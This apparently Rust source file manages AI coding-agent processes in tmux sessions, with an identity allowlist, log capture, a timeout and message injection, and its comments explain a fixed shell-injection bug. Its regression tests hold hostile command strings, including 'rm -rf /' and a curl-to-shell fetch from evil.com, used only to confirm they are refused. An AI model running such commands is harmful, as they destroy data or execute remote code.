use anyhow::Result;
use std::sync::Arc;
use std::time::Duration;
use tokio::process::Command;
use tokio::sync::RwLock;
use uuid::Uuid;

use crate::daemon::state::DaemonState;

/// Resolves an agent identity to its `(program, args)` invocation — never a
/// shell. Mirrors `agent_runner::canonical_agent_identity`'s accepted input
/// forms so both handoff-delivery paths (the WS `Handover` command that
/// calls `spawn_agent` below, and `raios run`/`raios task` in
/// `agent_runner.rs`) treat the same identity string the same way.
///
/// Returns `None` for anything unrecognized instead of falling through to a
/// shell: the previous implementation ran `sh -lc <agent_name>` (Unix) /
/// `powershell -Command <agent_name>` (Windows) with `agent_name` taken
/// verbatim from the WS client's `target` field (`daemon/handlers.rs`'s
/// `"Handover"` command) — an unauthenticated-content shell injection, only
/// not live-exploitable today because `Handover` happens to default to
/// `action = "confirm"` in `raios-policy.toml` (see `security/umai.rs`),
/// which is a policy setting, not a code guarantee.
fn agent_command(agent_name: &str) -> Option<(&'static str, Vec<String>)> {
    match agent_name.trim().to_lowercase().as_str() {
        "claude" | "claude_kaira" => Some(("claude", vec![])),
        "codex" | "codex_kaira" => Some(("codex", vec![])),
        "opencode" | "opencode_kaira" => Some(("opencode", vec![])),
        "antigravity" | "agy" | "antigravity_kaira" => Some(("agy", vec![])),
        _ => None,
    }
}

/// One naming scheme for tmux sessions, defined once. Every steer/spawn/kill
/// call derives the session name this way — never re-formatted ad hoc.
pub(crate) fn tmux_session_name(id: Uuid) -> String {
    format!("raios-agent-{id}")
}

/// Upper bound on how many captured output lines one agent keeps in
/// `AgentProcess.logs`.
///
/// `logs` is not a transient buffer: it lives for the daemon's whole lifetime
/// and the entire `active_agents` list — `logs` included — is serialized into
/// every state snapshot pushed to every connected TUI/dashboard client. The
/// tmux `pipe-pane` capture path attaches to a real pty, so what lands here
/// is whatever the wrapped agent CLI *renders*, including the continuous
/// ANSI/cursor repaint traffic interactive TUIs emit — orders of magnitude
/// more than the old non-TTY line-tagged capture. Unbounded, a long-lived
/// agent grows this without limit and fans the whole thing out on every push.
///
/// Oldest-first eviction: the tail is what a human debugging a live agent
/// actually reads.
const MAX_AGENT_LOG_LINES: usize = 1000;

/// Appends one captured line to `agent.logs`, evicting from the front once
/// [`MAX_AGENT_LOG_LINES`] is exceeded — a ring buffer in behavior, without
/// changing `logs`'s public `Vec<String>` type (it is `serde`-serialized into
/// the state snapshot every TUI client receives).
/// Builds the error returned when a steer's `tmux send-keys` call fails
/// *after* `has-session` already confirmed the target session is alive.
///
/// Deliberately does **not** touch `DaemonState` — this is the one thing that
/// separates it from the `!alive` branch in [`ExecutionProxy::steer_agent`].
/// That branch legitimately marks the agent dead: its session really is gone.
/// This one means "the session is there, delivery didn't land" (a TOCTOU race
/// with a process exiting between the two `tmux` invocations, or a hiccup on
/// a contended tmux server). Flipping `status` here would be doubly wrong: it
/// is factually false (the session *was* found), and because `steer_agent`'s
/// own target lookup requires `status == "Running"`, it is a one-way door —
/// one failed delivery would permanently make a healthy, running agent
/// unsteerable. Report the failure to the caller; leave the state alone.
fn steer_delivery_failed(
    session: &str,
    target_name: &str,
    stage: &str,
    exit_code: Option<i32>,
) -> anyhow::Error {
    anyhow::anyhow!(
        "tmux {} failed for session '{}' (exit: {:?}) — steer to agent '{}' not delivered; \
         the session is still considered live and can be steered again",
        stage,
        session,
        exit_code,
        target_name
    )
}

fn push_capped_log(agent: &mut AgentProcess, line: String) {
    agent.logs.push(line);
    while agent.logs.len() > MAX_AGENT_LOG_LINES {
        agent.logs.remove(0);
    }
}

/// Representation of an active agent process.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentProcess {
    pub id: Uuid,
    pub name: String,
    pub status: String,
    pub started_at: std::time::SystemTime,
    pub logs: Vec<String>,
}

#[derive(Clone)]
pub struct ExecutionProxy {
    state: Arc<RwLock<DaemonState>>,
    event_tx: Option<tokio::sync::broadcast::Sender<String>>,
}

impl ExecutionProxy {
    pub fn new(state: Arc<RwLock<DaemonState>>) -> Self {
        Self {
            state,
            event_tx: None,
        }
    }

    pub fn with_event_tx(mut self, tx: tokio::sync::broadcast::Sender<String>) -> Self {
        self.event_tx = Some(tx);
        self
    }

    fn push_event(&self, event: serde_json::Value) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(event.to_string());
        }
    }

    /// Spawns an agent in an isolated environment with a Death Timer.
    ///
    /// `agent_name` must resolve via `agent_command` to one of the four
    /// canonical agent identities — anything else is refused before any
    /// process state is touched. No ambient authority: an unrecognized
    /// identity is not a "best effort" shell invocation, it's an error.
    pub async fn spawn_agent(
        &self,
        agent_name: &str,
        project_path: &str,
        timeout_secs: u64,
    ) -> Result<String> {
        let (program, program_args) = agent_command(agent_name).ok_or_else(|| {
            anyhow::anyhow!(
                "Unknown agent identity '{}' — refusing to spawn",
                agent_name
            )
        })?;

        let process_id = Uuid::new_v4();

        // Register the process in state
        let agent_proc = AgentProcess {
            id: process_id,
            name: agent_name.to_string(),
            status: "Running".to_string(),
            started_at: std::time::SystemTime::now(),
            logs: Vec::new(),
        };

        {
            let mut state_lock = self.state.write().await;
            state_lock.active_agents.push(agent_proc.clone());
        }

        self.push_event(serde_json::json!({
            "event": "AgentStarted",
            "agent_id": process_id.to_string(),
            "name": agent_name,
            "project_path": project_path,
        }));

        let session_name = tmux_session_name(process_id);
        if let Err(e) = self
            .spawn_via_tmux(
                process_id,
                program,
                &program_args,
                project_path,
                timeout_secs,
            )
            .await
        {
            let mut state_lock = self.state.write().await;
            if let Some(agent) = state_lock
                .active_agents
                .iter_mut()
                .find(|a| a.id == process_id)
            {
                agent.status = "Failed to spawn process".to_string();
            }
            drop(state_lock);
            return Err(e);
        }
        println!(
            "[Proxy] Spawning agent '{}' (ID: {}) with {}s death timer via tmux session '{}'",
            agent_name, process_id, timeout_secs, session_name
        );

        Ok(process_id.to_string())
    }

    /// Launches `program` (with `args`) inside a detached tmux session named
    /// after `id`, polls for the pane's exit via tmux's own `remain-on-exit`
    /// and `pane_dead_status` (tmux keeps the dead pane around instead of
    /// auto-closing the session, so we can read the real exit code — a bare
    /// `tmux has-session` poll can't distinguish success from failure), and
    /// writes the resulting status into `DaemonState.active_agents` exactly
    /// like the pre-tmux `Command::spawn` path did. `timeout_secs` is the
    /// Death Timer: exceeding it kills the session and records
    /// `"Killed by Death Timer (Timeout)"`, unchanged from before.
    ///
    /// Also captures pane output into `AgentProcess.logs` via `tmux
    /// pipe-pane` writing to a logfile, tailed by a second background task.
    ///
    /// Deliberately `pub(crate)`, not `pub`: it takes an arbitrary
    /// `program`/`args` and would hand any downstream caller the ability to
    /// launch any binary through the daemon, routing straight around
    /// `agent_command()`'s four-identity allowlist directly above — the exact
    /// "ambient authority" this file's own history (the `sh -lc` shell
    /// injection documented on `agent_command`) exists to prevent. A doc
    /// comment is not an access boundary; the visibility modifier is. Tests
    /// that need to drive a scripted `sh -c '...'` through this machinery
    /// live in-crate (see this module's `#[cfg(test)] mod tests`) rather than
    /// widening the public API to reach them.
    ///
    /// It does not register anything in `DaemonState.active_agents` itself
    /// (see the find-only contract noted below) — `spawn_agent` validates the
    /// agent identity and registers state before delegating here.
    pub(crate) async fn spawn_via_tmux(
        &self,
        id: Uuid,
        program: &str,
        args: &[String],
        cwd: &str,
        timeout_secs: u64,
    ) -> Result<()> {
        let session = tmux_session_name(id);

        let mut new_session = Command::new("tmux");
        new_session
            .arg("new-session")
            .arg("-d")
            .arg("-s")
            .arg(&session)
            .arg("-c")
            .arg(cwd)
            .arg(program);
        for a in args {
            new_session.arg(a);
        }
        let status = new_session.status().await?;
        if !status.success() {
            return Err(anyhow::anyhow!(
                "tmux new-session failed for session '{}' (exit: {:?})",
                session,
                status.code()
            ));
        }

        // Keep the pane around after the command exits so we can read its
        // exit status instead of the session silently vanishing.
        Command::new("tmux")
            .args(["set-option", "-t", &session, "remain-on-exit", "on"])
            .status()
            .await?;

        // Capture the pane's output into a logfile via `tmux pipe-pane`, so
        // `AgentProcess.logs` stays populated for tmux-launched agents (Task
        // 2 dropped this when it moved off piped `Command::spawn` stdout).
        let log_dir = std::env::temp_dir().join("raios-agent-logs");
        tokio::fs::create_dir_all(&log_dir).await.ok();
        let logfile = log_dir.join(format!("{session}.log"));

        let pipe_pane_status = Command::new("tmux")
            .args([
                "pipe-pane",
                "-o",
                "-t",
                &session,
                &format!("cat >> {}", logfile.display()),
            ])
            .status()
            .await?;

        if !pipe_pane_status.success() {
            // `.status().await?` above only errors on a spawn failure (the
            // `tmux` binary itself missing) — a nonzero *exit* from `tmux
            // pipe-pane` (e.g. "target pane has exited") is still `Ok` and
            // would otherwise pass through here silently. That specific
            // failure is exactly the race this file documents elsewhere:
            // the pane's command already exited before `pipe-pane` attached.
            // `agent_command()` resolves each identity to a bare binary name
            // with no PATH/existence check, so a missing binary, broken
            // PATH, or an agent CLI crashing on startup (e.g. missing auth)
            // lands squarely in this window — and that's precisely the
            // moment captured output matters most for diagnosing why the
            // agent didn't start. Leaving `AgentProcess.logs` silently empty
            // forever would hide the failure instead of explaining it, so
            // record an explicit synthetic entry instead. Same find-only
            // contract as the rest of `spawn_via_tmux` — never inserts.
            let mut state_lock = self.state.write().await;
            if let Some(agent) = state_lock.active_agents.iter_mut().find(|a| a.id == id) {
                push_capped_log(
                    agent,
                    "[raios] output capture failed to attach (pane may have already exited)"
                        .to_string(),
                );
            }
            drop(state_lock);
        }

        let state = self.state.clone();
        let event_tx = self.event_tx.clone();
        let session_for_task = session.clone();

        let state_for_logs = self.state.clone();
        let logfile_for_task = logfile.clone();
        tokio::spawn(async move {
            use tokio::io::{AsyncBufReadExt, BufReader};

            // `cat >>` creates the file on open even before the first write,
            // but there's a short window right after the pipe-pane command
            // returns before that open happens — wait for it rather than
            // failing to open.
            for _ in 0..25 {
                if tokio::fs::metadata(&logfile_for_task).await.is_ok() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
            let Ok(file) = tokio::fs::File::open(&logfile_for_task).await else {
                return;
            };
            let mut reader = BufReader::new(file);
            let mut line = String::new();
            loop {
                line.clear();
                match reader.read_line(&mut line).await {
                    Ok(0) => {
                        // EOF on a plain file doesn't mean "no more data
                        // ever" the way it would on a closed pipe — `cat`
                        // may still be appending. Poll instead of stopping.
                        // Give up once the session itself is gone.
                        let still_alive = Command::new("tmux")
                            .args(["has-session", "-t", &session])
                            .status()
                            .await
                            .map(|s| s.success())
                            .unwrap_or(false);
                        if !still_alive {
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(300)).await;
                    }
                    Ok(_) => {
                        let mut s = state_for_logs.write().await;
                        if let Some(agent) = s.active_agents.iter_mut().find(|a| a.id == id) {
                            push_capped_log(agent, line.trim_end().to_string());
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        tokio::spawn(async move {
            let poll_interval = Duration::from_millis(500);
            let max_polls = ((timeout_secs * 1000) / poll_interval.as_millis() as u64).max(1);
            let mut final_status = "Killed by Death Timer (Timeout)";

            for _ in 0..max_polls {
                tokio::time::sleep(poll_interval).await;

                let dead = Command::new("tmux")
                    .args([
                        "display-message",
                        "-p",
                        "-t",
                        &session_for_task,
                        "#{pane_dead}",
                    ])
                    .output()
                    .await
                    .ok()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "1")
                    .unwrap_or(false);

                if dead {
                    let exit_ok = Command::new("tmux")
                        .args([
                            "display-message",
                            "-p",
                            "-t",
                            &session_for_task,
                            "#{pane_dead_status}",
                        ])
                        .output()
                        .await
                        .ok()
                        .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0")
                        .unwrap_or(false);
                    final_status = if exit_ok {
                        "Completed Successfully"
                    } else {
                        "Exited with Error"
                    };
                    break;
                }
            }

            // Either the pane died naturally (final_status set above) or the
            // Death Timer ran out (final_status still its default) — either
            // way, tear the session down. Killing an already-dead session's
            // remnants is a no-op tmux tolerates.
            let _ = Command::new("tmux")
                .args(["kill-session", "-t", &session_for_task])
                .status()
                .await;

            let mut state_lock = state.write().await;
            if let Some(agent) = state_lock.active_agents.iter_mut().find(|a| a.id == id) {
                agent.status = final_status.to_string();
            }
            drop(state_lock);

            if let Some(tx) = &event_tx {
                let _ = tx.send(
                    serde_json::json!({
                        "event": "AgentStopped",
                        "agent_id": id.to_string(),
                        "final_status": final_status,
                    })
                    .to_string(),
                );
            }
        });

        Ok(())
    }

    /// Injects `message` into a currently-running, tmux-backed agent session
    /// as if the sender had typed it — `tmux send-keys`, the same mechanism
    /// omnigent-ai/omnigent uses for its live-verified `claude-native` steer
    /// path (see docs/superpowers/specs/2026-08-07-tmux-steer-design.md).
    /// Best-effort delivery: this does not know whether the target is mid
    /// turn or idle, and does not claim to. `sender` is recorded verbatim
    /// into the audit ledger's `actor` column for traceability — callers
    /// resolve it the same way existing call sites do (CLI:
    /// `RAIOS_AGENT_IDENTITY` env var; MCP: the tool call's caller context).
    pub async fn steer_agent(&self, agent_id: Uuid, message: &str, sender: &str) -> Result<()> {
        let target_name = {
            let state_lock = self.state.read().await;
            let agent = state_lock
                .active_agents
                .iter()
                .find(|a| a.id == agent_id && a.status == "Running")
                .ok_or_else(|| {
                    anyhow::anyhow!(
                        "steer target not found: no running agent with id '{}'",
                        agent_id
                    )
                })?;
            agent.name.clone()
        };

        let session = tmux_session_name(agent_id);

        let alive = Command::new("tmux")
            .args(["has-session", "-t", &session])
            .status()
            .await
            .map(|s| s.success())
            .unwrap_or(false);
        if !alive {
            // The session really is gone — the agent finished or crashed —
            // so marking it as such is correct here. Contrast with a
            // `send-keys` failure *after* this check passes, which is
            // deliberately non-mutating (see `steer_delivery_failed`).
            let mut state_lock = self.state.write().await;
            if let Some(agent) = state_lock
                .active_agents
                .iter_mut()
                .find(|a| a.id == agent_id)
            {
                agent.status = "Session Not Found (Steer Failed)".to_string();
            }
            return Err(anyhow::anyhow!(
                "steer target session '{}' not found — agent '{}' may have finished or crashed",
                session,
                target_name
            ));
        }

        // `-l` (literal) plus the `--` end-of-options separator: without them
        // tmux parses `message` as *key names*, not text. Verified against
        // tmux 3.6 — a message of exactly `C-c` sends a real Ctrl-C (which
        // can kill the target session outright) and a message starting with
        // `-` (e.g. `-X`) is consumed by tmux's own getopt and fails. Since
        // `message` is fully caller-controlled (the MCP `steer_agent` tool
        // makes it agent-controlled), the un-flagged form is an undocumented
        // remote interrupt/kill primitive hiding inside a text-injection
        // feature, and the audit ledger would record the raw string as if it
        // were harmless text. `-l` makes it exactly what it says it is:
        // literal input.
        //
        // Enter must then be a *separate* call: `-l` applies to the whole
        // argument list, so appending "Enter" to the literal send would type
        // the five characters `E n t e r` instead of submitting the line.
        let send_status = Command::new("tmux")
            .args(["send-keys", "-t", &session, "-l", "--", message])
            .status()
            .await?;
        if !send_status.success() {
            return Err(steer_delivery_failed(
                &session,
                &target_name,
                "send-keys (literal message)",
                send_status.code(),
            ));
        }

        let enter_status = Command::new("tmux")
            .args(["send-keys", "-t", &session, "Enter"])
            .status()
            .await?;
        if !enter_status.success() {
            return Err(steer_delivery_failed(
                &session,
                &target_name,
                "send-keys Enter (submit)",
                enter_status.code(),
            ));
        }

        self.push_event(serde_json::json!({
            "event": "AgentSteered",
            "agent_id": agent_id.to_string(),
            "sender": sender,
        }));

        if let Ok(conn) = raios_core::db::open_db() {
            let data = serde_json::json!({
                "target_agent_id": agent_id.to_string(),
                "target_agent_name": target_name,
                "message": message,
            })
            .to_string();
            let _ = raios_core::security::record_audit_event(&conn, "agent.steer", sender, &data);
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::{agent_command, tmux_session_name};

    #[test]
    fn tmux_session_name_uses_raios_agent_prefix_and_id() {
        let id = uuid::Uuid::new_v4();
        assert_eq!(tmux_session_name(id), format!("raios-agent-{id}"));
    }

    #[test]
    fn agent_command_resolves_all_canonical_identities() {
        assert_eq!(agent_command("claude"), Some(("claude", vec![])));
        assert_eq!(agent_command("claude_kaira"), Some(("claude", vec![])));
        assert_eq!(agent_command("codex"), Some(("codex", vec![])));
        assert_eq!(agent_command("codex_kaira"), Some(("codex", vec![])));
        assert_eq!(agent_command("opencode"), Some(("opencode", vec![])));
        assert_eq!(agent_command("opencode_kaira"), Some(("opencode", vec![])));
        assert_eq!(agent_command("antigravity"), Some(("agy", vec![])));
        assert_eq!(agent_command("agy"), Some(("agy", vec![])));
        assert_eq!(agent_command("antigravity_kaira"), Some(("agy", vec![])));
    }

    #[test]
    fn agent_command_is_case_and_whitespace_insensitive() {
        assert_eq!(agent_command("  Claude  "), Some(("claude", vec![])));
        assert_eq!(agent_command("CODEX"), Some(("codex", vec![])));
    }

    /// Regression test for the shell-injection bug this module used to have:
    /// `agent_name` is client-supplied (WS `Handover` command's `target`
    /// field) and used to be handed straight to `sh -lc`/`powershell
    /// -Command`. Anything that isn't a known agent identity — including a
    /// deliberately shell-metacharacter-laden string — must be refused, not
    /// passed to a shell "best effort".
    #[test]
    fn agent_command_rejects_unknown_or_injection_looking_input() {
        assert_eq!(agent_command("claude; rm -rf /"), None);
        assert_eq!(agent_command("$(curl evil.com/x | sh)"), None);
        assert_eq!(agent_command(""), None);
        assert_eq!(agent_command("gemini"), None); // removed CLI, see 2026-06-22 changelog
    }

    #[tokio::test]
    async fn spawn_agent_rejects_unknown_identity_before_touching_state() {
        use super::{DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());

        let result = proxy
            .spawn_agent("claude; touch /tmp/pwned", "/tmp", 5)
            .await;
        assert!(result.is_err());
        assert!(state.read().await.active_agents.is_empty());
    }

    #[tokio::test]
    #[cfg_attr(
        windows,
        ignore = "tmux is not available on Windows; spawn_via_tmux has no Windows implementation yet"
    )]
    async fn spawn_agent_via_tmux_reaches_completed_status() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        // `agent_command("claude")` resolves to a real "claude" binary this test
        // environment doesn't control, so this test exercises the tmux/exit-status
        // plumbing directly by calling the new `spawn_via_tmux` helper (Step 3)
        // with an arbitrary harmless command instead of going through the
        // `agent_command()` allowlist — that allowlist itself is already covered
        // by `agent_command_resolves_all_canonical_identities` above.
        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // `spawn_via_tmux`'s contract only ever *finds and updates* an
        // existing `AgentProcess` entry — it does not register one itself.
        // The real `spawn_agent` caller registers this "Running" entry
        // before calling `spawn_via_tmux`; mirror that here since this test
        // calls `spawn_via_tmux` directly.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "true".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        // Death Timer widened repeatedly under real, measured CI contention:
        // 5s (Task 2) -> 30s -> 60s -> 150s here. Under `cargo test
        // --workspace --lib`'s full parallel run, dozens of
        // `#[tokio::test]`s across the workspace fork real `tmux`
        // subprocesses at once, and on a contended GitHub Actions runner
        // that can slow every individual `tmux display-message`/`tmux
        // new-session` call enough that `spawn_via_tmux`'s internal
        // exit-status poller — itself bounded by this same Death Timer —
        // runs out of polls and declares "Killed by Death Timer (Timeout)"
        // before it ever observes `true`'s (near-instant) real exit.
        // Confirmed via Task 8's mandatory full-workspace verification: a
        // prior fix here that only widened this test's own *outer* wait
        // loop (not the Death Timer itself) masked the first symptom
        // (status still "Running") but not this one — the production
        // poller had already given up and recorded "Killed by Death Timer"
        // by the time the outer loop's window closed. Giving the poller a
        // much larger budget (and lengthening the outer wait to match)
        // fixes the actual bottleneck rather than widening the wrong wait;
        // this is a test-only timing change to a pre-existing Task 2 test,
        // not a `spawn_via_tmux` behavior change. Widened from 30s to 60s
        // after hitting it under `cargo llvm-cov`'s coverage job overhead,
        // then from 60s to 150s after the *entire raios-runtime test suite*
        // was measured finishing in 62.64s on a real GitHub Actions
        // ubuntu-latest run — meaning this one test's 60s budget could be
        // exhausted well before its own logic even got scheduled CPU time,
        // independent of `true`'s own (trivial) runtime. 150s gives >2x
        // headroom over that measured worst case while still bounding the
        // test if `spawn_via_tmux` were ever genuinely broken.
        proxy
            .spawn_via_tmux(id, "true", &[], ".", 150)
            .await
            .expect("tmux spawn should succeed");

        let mut status = String::new();
        for _ in 0..1600 {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                status = agent.status.clone();
                if status != "Running" {
                    break;
                }
            }
        }
        assert_eq!(status, "Completed Successfully");
    }

    #[tokio::test]
    #[cfg_attr(
        windows,
        ignore = "tmux is not available on Windows; spawn_via_tmux has no Windows implementation yet"
    )]
    async fn spawn_agent_via_tmux_death_timer_kills_long_running_session() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // See the matching comment in `spawn_agent_via_tmux_reaches_completed_status`
        // above — `spawn_via_tmux` only updates a pre-existing entry, it never
        // registers one, so this test registers it itself before calling in.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sleep".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(id, "sleep", &["30".to_string()], ".", 1)
            .await
            .expect("tmux spawn should succeed");

        let mut status = String::new();
        for _ in 0..40 {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                status = agent.status.clone();
                if status != "Running" {
                    break;
                }
            }
        }
        assert_eq!(status, "Killed by Death Timer (Timeout)");
    }

    #[tokio::test]
    #[cfg_attr(
        windows,
        ignore = "tmux is not available on Windows; spawn_via_tmux has no Windows implementation yet"
    )]
    async fn spawn_agent_via_tmux_captures_output_into_logs() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::process::Command;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // Same find-only contract as the other `spawn_via_tmux` tests above:
        // it never registers an `AgentProcess` itself, so the caller (here,
        // the test) must do so first or the log-tailing task's `find` will
        // never match anything to push lines into.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sh".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        // `tmux pipe-pane` attaches to the pane in a follow-up `tmux` call
        // *after* `new-session` has already started the pane's command —
        // empirically ~20-25ms later on this machine (three sequential
        // `tmux` client invocations: new-session, set-option, pipe-pane).
        // A command that prints and exits immediately (bare `echo`) races
        // that attach: on a loaded system the pane can already be dead
        // before pipe-pane hooks up, which makes tmux refuse to attach at
        // all ("target pane has exited") and lose the output entirely —
        // reproduced directly at ~30% with a bare `echo` in manual testing.
        // Real steer targets (claude/codex/opencode/agy) are long-running
        // interactive processes, so this window is a non-issue in
        // production; here we just give the pane's first output a small
        // head start margin so the test is deterministic, which also
        // exercises the tailing task's "EOF, poll for more" loop (the
        // actual behavior Task 3 adds) instead of only the trivial
        // already-has-a-line-on-first-open case.
        proxy
            .spawn_via_tmux(
                id,
                "sh",
                &[
                    "-c".to_string(),
                    "sleep 0.5 && echo hello-from-tmux".to_string(),
                ],
                ".",
                5,
            )
            .await
            .expect("tmux spawn should succeed");

        let mut found = false;
        for _ in 0..30 {
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                if agent.logs.iter().any(|l| l.contains("hello-from-tmux")) {
                    found = true;
                    break;
                }
            }
        }
        // This test only waits for the echoed line to land in `logs`, not
        // for the (untouched, Task 2) exit-status polling task to observe
        // the pane's death and tear the session down itself — `sh -c echo`
        // exits fast enough that the assertion above routinely wins that
        // race, and #[tokio::test]'s per-test runtime drops the still-sleeping
        // polling task without letting it reach its own `kill-session` call.
        // Clean up explicitly rather than leaking a dead tmux session (and
        // its logfile) on every run.
        let session = super::tmux_session_name(id);
        let _ = Command::new("tmux")
            .args(["kill-session", "-t", &session])
            .status()
            .await;
        let _ = tokio::fs::remove_file(
            std::env::temp_dir()
                .join("raios-agent-logs")
                .join(format!("{session}.log")),
        )
        .await;

        assert!(found, "expected captured logs to contain the echoed line");
    }

    #[tokio::test]
    async fn steer_agent_rejects_unknown_target() {
        use super::{DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state);
        let err = proxy
            .steer_agent(uuid::Uuid::new_v4(), "hello", "claude_kaira")
            .await
            .expect_err("steering an unknown agent id must fail");
        assert!(err.to_string().contains("not found"));
    }

    #[tokio::test]
    #[cfg_attr(
        windows,
        ignore = "tmux is not available on Windows; spawn_via_tmux has no Windows implementation yet"
    )]
    async fn steer_agent_sends_keys_into_live_session() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // `spawn_via_tmux`'s contract only ever *finds and updates* an
        // existing `AgentProcess` entry — it does not register one itself
        // (see the matching comments on the other `spawn_via_tmux` tests
        // above). `steer_agent` additionally requires a `"Running"` entry to
        // resolve its target, so register one before spawning, exactly like
        // every other direct `spawn_via_tmux` caller in this test module.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sh".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        // A session that reads one line and echoes it back with a marker prefix —
        // lets the test assert the steered message actually reached the pane.
        proxy
            .spawn_via_tmux(
                id,
                "sh",
                &[
                    "-c".to_string(),
                    "read line; echo \"STEERED:$line\"; sleep 5".to_string(),
                ],
                ".",
                10,
            )
            .await
            .expect("tmux spawn should succeed");

        // Give the session a moment to reach the `read` before steering it.
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

        proxy
            .steer_agent(id, "ping-from-test", "claude_kaira")
            .await
            .expect("steer should succeed against a live session");

        let mut found = false;
        for _ in 0..30 {
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                if agent
                    .logs
                    .iter()
                    .any(|l| l.contains("STEERED:ping-from-test"))
                {
                    found = true;
                    break;
                }
            }
        }

        // This test's assertion routinely resolves well before the pane's
        // own `sleep 5` finishes and long before the 10s Death Timer, so
        // (like `spawn_agent_via_tmux_captures_output_into_logs` above) the
        // background exit-status/kill-session task never gets to run before
        // `#[tokio::test]` tears down this test's runtime. Clean up
        // explicitly rather than leaking a live tmux session (and its
        // logfile) on every run.
        let session = super::tmux_session_name(id);
        let _ = tokio::process::Command::new("tmux")
            .args(["kill-session", "-t", &session])
            .status()
            .await;
        let _ = tokio::fs::remove_file(
            std::env::temp_dir()
                .join("raios-agent-logs")
                .join(format!("{session}.log")),
        )
        .await;

        assert!(
            found,
            "expected the steered message to be echoed back through captured logs"
        );
    }

    #[test]
    fn push_capped_log_evicts_oldest_lines_past_the_cap() {
        use super::{push_capped_log, AgentProcess, MAX_AGENT_LOG_LINES};

        let mut agent = AgentProcess {
            id: uuid::Uuid::new_v4(),
            name: "sh".to_string(),
            status: "Running".to_string(),
            started_at: std::time::SystemTime::now(),
            logs: Vec::new(),
        };

        for i in 0..(MAX_AGENT_LOG_LINES + 250) {
            push_capped_log(&mut agent, format!("line-{i}"));
        }

        assert_eq!(
            agent.logs.len(),
            MAX_AGENT_LOG_LINES,
            "logs must stay bounded — this vec lives for the daemon's lifetime \
             and is serialized into every state snapshot pushed to TUI clients"
        );
        assert_eq!(
            agent.logs.first().map(String::as_str),
            Some("line-250"),
            "oldest lines are the ones evicted"
        );
        let newest = format!("line-{}", MAX_AGENT_LOG_LINES + 249);
        assert_eq!(
            agent.logs.last(),
            Some(&newest),
            "the newest line must always survive"
        );
    }

    /// A steer whose delivery fails *after* `has-session` confirmed the
    /// session is alive must not mark the agent dead. `steer_agent`'s own
    /// target lookup requires `status == "Running"`, so flipping the status
    /// on a delivery failure is a one-way door: a healthy, running agent
    /// would become permanently unsteerable. Asserted on the error builder
    /// itself, since the only way to make a real `send-keys` fail against a
    /// verified-live session is to win a TOCTOU race with it.
    #[test]
    fn steer_delivery_failure_error_does_not_claim_the_session_is_gone() {
        use super::steer_delivery_failed;

        let err = steer_delivery_failed(
            "raios-agent-x",
            "claude",
            "send-keys Enter (submit)",
            Some(1),
        );
        let text = err.to_string();
        assert!(
            text.contains("not delivered"),
            "must state delivery failed, got: {text}"
        );
        assert!(
            text.contains("can be steered again"),
            "must not imply the agent is gone, got: {text}"
        );
        assert!(
            !text.contains("Session Not Found"),
            "the dead-session status string belongs only to the has-session \
             branch, got: {text}"
        );
    }
}

/// End-to-end coverage for the tmux-backed spawn -> steer -> captured-output
/// path: real `tmux` process, real pane, real `tmux send-keys` delivery.
/// Requires a real `tmux` binary on PATH — the same runtime dependency `raios
/// doctor`'s tmux presence check exists to catch.
///
/// In-crate (rather than under `crates/raios-runtime/tests/`) on purpose:
/// driving this path needs `spawn_via_tmux`, and `spawn_via_tmux` is
